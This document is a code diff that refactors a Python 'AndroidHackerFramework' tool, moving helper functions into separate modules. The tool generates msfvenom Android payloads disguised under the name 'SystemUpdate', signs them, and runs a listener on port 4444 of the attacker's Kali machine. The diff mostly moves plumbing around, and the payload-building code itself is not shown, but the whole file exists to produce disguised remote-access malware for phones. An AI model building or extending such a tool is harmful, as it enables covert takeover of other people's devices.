@@ -21,6 +21,11 @@ import subprocess
 from colorama import init, Fore, Style, Back
 import platform
 
+# Modular imports
+from modules.utils import get_local_ip, check_root, check_tool
+from modules.payload_builder import PayloadBuilder
+from modules.listener import Listener
+
 # Initialize colorama
 init(autoreset=True)
 
@@ -30,25 +35,11 @@ class AndroidHackerFramework:
     def __init__(self):
         self.version = "3.0"
         self.author = "Security Researcher"
-        self.kali_ip = self.get_local_ip()
+        self.kali_ip = get_local_ip()
         self.port = 4444
         self.payload_name = "SystemUpdate"
         self.clear_screen()
-        
-    def get_local_ip(self):
-        """Get local IP address"""
-        try:
-            # Try to get IP from network
-            result = subprocess.run(["hostname", "-I"], capture_output=True, text=True)
-            if result.stdout:
-                ips = result.stdout.strip().split()
-                for ip in ips:
-                    if ip.startswith("192.168") or ip.startswith("10."):
-                        return ip
-            return "192.168.1.108"
-        except:
-            return "192.168.1.108"
-    
+
     def clear_screen(self):
         """Clear terminal screen"""
         os.system('clear' if platform.system() != 'Windows' else 'cls')
@@ -107,7 +98,6 @@ class AndroidHackerFramework:
         """Generate Android payload"""
         print(f"\n{Fore.YELLOW}[+] Generating Android payload...{Fore.WHITE}\n")
         
-        from modules.payload_builder import PayloadBuilder
         builder = PayloadBuilder(self.kali_ip, self.port, self.payload_name)
         builder.build()
         
@@ -225,10 +215,10 @@ class AndroidHackerFramework:
   Hostname    : {platform.node()}
 
 {Fore.GREEN}Required Tools:{Fore.WHITE}
-  msfvenom    : {self.check_tool('msfvenom')}
-  keytool     : {self.check_tool('keytool')}
-  apksigner   : {self.check_tool('apksigner')}
-  zipalign    : {self.check_tool('zipalign')}
+  msfvenom    : {self.get_tool_status('msfvenom')}
+  keytool     : {self.get_tool_status('keytool')}
+  apksigner   : {self.get_tool_status('apksigner')}
+  zipalign    : {self.get_tool_status('zipalign')}
 
 {Fore.GREEN}Features:{Fore.WHITE}
   ✓ Android 15/16 Compatible
@@ -242,12 +232,11 @@ class AndroidHackerFramework:
         """
         print(info)
         
-    def check_tool(self, tool):
+    def get_tool_status(self, tool):
         """Check if tool is installed"""
-        try:
-            subprocess.run(["which", tool], capture_output=True, check=True)
+        if check_tool(tool):
             return f"{Fore.GREEN}✓ Installed{Fore.WHITE}"
-        except:
+        else:
             return f"{Fore.RED}✗ Missing{Fore.WHITE}"
     
     def install_requirements(self):
@@ -310,8 +299,7 @@ class AndroidHackerFramework:
 
 def main():
     """Main entry point"""
-    if os.geteuid() != 0:
-        print(f"{Fore.RED}[!] This tool requires root privileges!{Fore.WHITE}")
+    if not check_root():
         print(f"{Fore.YELLOW}[+] Run with: sudo python3 android_hacker.py{Fore.WHITE}")
         sys.exit(1)
     
